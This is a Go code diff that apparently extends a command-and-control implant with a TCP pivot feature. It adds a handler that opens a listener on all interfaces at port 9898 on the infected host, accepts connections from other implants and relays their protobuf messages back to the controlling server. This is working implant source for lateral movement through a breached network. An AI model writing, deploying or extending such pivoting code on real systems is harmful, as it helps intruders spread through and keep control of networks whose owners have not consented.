@@ -1,8 +1,13 @@
 package handlers
 
 import (
+	"fmt"
+	"math/rand"
 	"net"
+	"os"
+	"strings"
 	"sync"
+	"time"
 
 	// {{if .Debug}}
 	"log"
@@ -35,6 +40,7 @@ import (
 var (
 	genericPivotHandlers = map[uint32]PivotHandler{
 		pb.MsgPivotData: pivotDataHandler,
+		pb.MsgTCPReq:    tcpListenerHandler,
 	}
 )
 
@@ -42,6 +48,129 @@ var (
 func GetPivotHandlers() map[uint32]PivotHandler {
 	return genericPivotHandlers
 }
+
+func tcpListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
+	// {{if .Debug}}
+	log.Printf("tcpListenerHandler")
+	// {{end}}
+	StartTCPListener("0.0.0.0", uint16(9898), connection)
+	// TODO: handle error
+	tcpResp := &pb.TCP{
+		Success: true,
+	}
+	data, _ := proto.Marshal(tcpResp)
+	connection.Send <- &pb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
+}
+
+// ============================================================================================================================================
+// ============================================================================================================================================
+// ============================================================================================================================================
+
+// StartTCPListener - Start a TCP listener
+func StartTCPListener(bindIface string, port uint16, connection *transports.Connection) (net.Listener, error) {
+	// {{if .Debug}}
+	log.Printf("Starting Raw TCP listener on %s:%d", bindIface, port)
+	// {{end}}
+	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", bindIface, port))
+	if err != nil {
+		// {{if .Debug}}
+		log.Println(err)
+		// {{end}}
+		return nil, err
+	}
+	go tcpPivotAcceptNewConnection(&ln, connection)
+	return ln, nil
+}
+
+func tcpPivotAcceptNewConnection(ln *net.Listener, connection *transports.Connection) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to determine hostname %s", err)
+		// {{end}}
+		hostname = "."
+	}
+	namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
+	for {
+		conn, err := (*ln).Accept()
+		if err != nil {
+			continue
+		}
+		rand.Seed(time.Now().UnixNano())
+		pivotID := rand.Uint32()
+		pivotsMap.AddPivot(pivotID, &conn)
+		SendPivotOpen(pivotID, "tcp", namedPipe, connection)
+
+		// {{if .Debug}}
+		log.Println("Accepted a new connection")
+		// {{end}}
+
+		// handle connection like any other net.Conn
+		go tcpPivotConnectionHandler(&conn, connection, pivotID)
+	}
+}
+
+func tcpPivotConnectionHandler(conn *net.Conn, connection *transports.Connection, pivotID uint32) {
+
+	defer func() {
+		// {{if .Debug}}
+		log.Println("Cleaning up for pivot %d", pivotID)
+		// {{end}}
+		(*conn).Close()
+		pivotClose := &pb.PivotClose{
+			PivotID: pivotID,
+		}
+		data, err := proto.Marshal(pivotClose)
+		if err != nil {
+			// {{if .Debug}}
+			log.Println(err)
+			// {{end}}
+		}
+		connection.Send <- &pb.Envelope{
+			Type: pb.MsgPivotClose,
+			Data: data,
+		}
+	}()
+
+	for {
+		envelope, err := pivots.PivotReadEnvelope(conn)
+		if err != nil {
+			// {{if .Debug}}
+			log.Println(err)
+			// {{end}}
+			return
+		}
+		dataBuf, err1 := proto.Marshal(envelope)
+		if err1 != nil {
+			// {{if .Debug}}
+			log.Println(err1)
+			// {{end}}
+			return
+		}
+		pivotOpen := &pb.PivotData{
+			PivotID: pivotID,
+			Data:    dataBuf,
+		}
+		data2, err2 := proto.Marshal(pivotOpen)
+		if err2 != nil {
+			// {{if .Debug}}
+			log.Println(err2)
+			// {{end}}
+			return
+		}
+		connection.Send <- &pb.Envelope{
+			Type: pb.MsgPivotData,
+			Data: data2,
+		}
+	}
+}
+
+// ============================================================================================================================================
+// ============================================================================================================================================
+// ============================================================================================================================================
 
 // SendPivotOpen - Sends a PivotOpen message back to the server
 func SendPivotOpen(pivotID uint32, pivotType string, remoteAddr string, connection *transports.Connection) {
@@ -61,7 +190,6 @@ func SendPivotOpen(pivotID uint32, pivotType string, remoteAddr string, connecti
 		Type: pb.MsgPivotOpen,
 		Data: data,
 	}
-
 }
 
 // SendPivotClose - Sends a PivotClose message back to the server
